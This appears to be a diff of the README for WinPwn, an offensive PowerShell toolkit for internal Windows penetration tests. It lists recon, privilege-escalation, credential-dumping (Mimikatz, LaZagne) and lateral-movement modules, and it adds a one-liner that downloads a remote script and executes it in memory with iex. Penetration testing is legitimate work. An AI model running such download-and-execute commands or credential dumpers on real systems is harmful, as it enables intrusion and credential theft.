@@ -10,7 +10,7 @@ Still much work to do - Automation for internal Windows Penetrationtest.
 			ii. Local Reconing -> Hostenum, SessionGopher, FileSearch, PSRecon
 			iii. Domain Reconing -> GetExploitableSystems, Powerview functions, ACL-Analysis, ADRecon
 				1) Todo: Grouper for Group Policy overview
-			iv. Privilege Escalation -> Powersploit (Allchecks), GPP-Passwords,  MS-Exploit Search (Sherlock)
+			iv. Privilege Escalation -> Powersploit (Allchecks), GPP-Passwords,  MS-Exploit Search (Sherlock), WCMDump, JAWS
 			v. Lazagne Password recovery
 			vi. Exploitation -> Kerberoasting, Mimikittenz, Mimikatz with Admin-rights
 			vii. LateralMovement ->  FindLocalAdminAccess 
@@ -21,8 +21,8 @@ Still much work to do - Automation for internal Windows Penetrationtest.
 			ix. FindGPOLocation --> Search for user/group rights 
 			x. Find-Fruit
 
-Just Import the Modules with "Import-Module .\WinPwn_v0.3.ps1"
-And Start the automatic Script with "WinPwn".
+Just Import the Modules with "Import-Module .\WinPwn_v0.4.ps1" or with iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.4.ps1')
+And Start the Script with "WinPwn".
 
 
 
